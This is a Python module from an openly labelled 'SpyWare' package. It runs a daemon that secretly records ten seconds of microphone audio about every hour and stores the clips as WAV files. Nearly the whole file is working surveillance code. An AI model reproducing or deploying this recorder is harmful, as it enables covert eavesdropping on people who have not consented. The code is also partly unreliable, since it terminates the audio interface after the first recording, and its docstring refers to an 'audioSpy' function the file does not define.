#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements a SpyWare to record from microphone.
#    Copyright (C) 2021, 2022  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements a SpyWare to record from microphone.

~# python3 AudioLogger.py audioSpy.conf

>>> from os import environ
>>> environ['audioSpy.conf'] = 'audioSpy.conf'
>>> from SpyWare.AudioLogger import audioSpy
>>> audioSpy()                  # (using env) OR
>>> audioSpy('audioSpy.conf') # (using config file name) OR
>>> audioSpy(argv=["AudioLogger.py", "audioSpy.conf"]) # (using argv)
"""

__version__ = "1.0.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This module implements a SpyWare to record from microphone.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SpyWare"

copyright = """
SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["main", "Daemon", "config_load"]

from os.path import join, exists, dirname
from configparser import ConfigParser
from pyaudio import PyAudio, paInt16
from wave import open as wave_open
from os import makedirs, environ
from sys import argv, exit
from typing import List
from time import sleep
from glob import glob


class CONFIGURATIONS:

    """
    This class contains configurations.
    """

    save_filename: str = "record*.wav"
    save_dirname: str = "records"
    record_time: float = 10
    interval: float = 3590
    FORMAT: int = paInt16
    CHUNK: int = 1024
    CHANNELS: int = 2
    RATE: int = 44100


def config_load(filename: str = None, argv: List[str] = argv) -> None:

    """
    This function loads the configuration using a the configuration file.
    """

    CONFIG = ConfigParser()

    default_file_name = "audioSpy.conf"
    default_file_path = join(dirname(__file__), default_file_name)
    env_config_file = environ.get(default_file_name)
    arg_config_file = argv[1] if len(argv) == 2 else None

    if filename is not None and exists(filename):
        CONFIG.read(filename)
    elif arg_config_file is not None and exists(arg_config_file):
        CONFIG.read(arg_config_file)
    elif env_config_file and exists(env_config_file):
        CONFIG.read(env_config_file)
    elif exists(default_file_path):
        CONFIG.read(default_file_path)
    else:
        return 1

    CONFIG = CONFIG.__dict__["_sections"]
    CONFIGURATIONS.save_filename = CONFIG.get("SAVE", {}).get(
        "filename", "record*.wav"
    )
    CONFIGURATIONS.record_time = float(
        CONFIG.get("TIME", {}).get("record_time", "10")
    )
    CONFIGURATIONS.interval = float(
        CONFIG.get("TIME", {}).get("interval", "3590")
    )
    CONFIGURATIONS.save_dirname = CONFIG.get("SAVE", {}).get(
        "records", "records"
    )
    return 0


class Daemon:

    """
    This class implements a loop to record from microphone.
    """

    def __init__(self):
        self.interval = CONFIGURATIONS.interval
        self.run = True
        path = self.path = join(
            CONFIGURATIONS.save_dirname, CONFIGURATIONS.save_filename
        )
        self.increment = len(glob(path))
        self.pyaudio = PyAudio()

    def run_for_ever(self) -> None:

        """
        This function record from microphone and sleep for ever.
        """

        makedirs(CONFIGURATIONS.save_dirname, exist_ok=True)
        internval = self.interval
        path = self.path
        increment = self.increment

        while self.run:
            self.save_record(
                path.replace("*", str(increment)), CONFIGURATIONS.record_time
            )
            increment += 1

            if self.run:
                sleep(internval)

    def save_record(self, filename: str, time: int) -> None:

        """
        This function records from microphone and save in wave file.
        """

        pyaudio = self.pyaudio
        format_ = CONFIGURATIONS.FORMAT
        channels = CONFIGURATIONS.CHANNELS
        rate = CONFIGURATIONS.RATE
        chunk = CONFIGURATIONS.CHUNK

        stream = pyaudio.open(
            format=format_,
            channels=channels,
            rate=rate,
            input=True,
            frames_per_buffer=chunk,
        )

        # frames = b"".join(
        #     [stream.read(chunk) for i in range(0, int(rate / chunk * time))]
        # )

        wf = wave_open(filename, "wb")
        wf.setnchannels(channels)
        wf.setsampwidth(pyaudio.get_sample_size(format_))
        wf.setframerate(rate)
        wf.writeframes(stream.read(round(rate * time)))
        wf.close()

        stream.stop_stream()
        stream.close()
        pyaudio.terminate()


def main(config_filename: str = None, argv: List[str] = argv) -> int:

    """
    This function starts the recorder
    daemon from the command line.
    """

    config_load(filename=config_filename, argv=argv)

    daemon = Daemon()
    try:
        daemon.run_for_ever()
    except KeyboardInterrupt:
        daemon.run = False

    return 0


if __name__ == "__main__":
    print(copyright)
    exit(main())
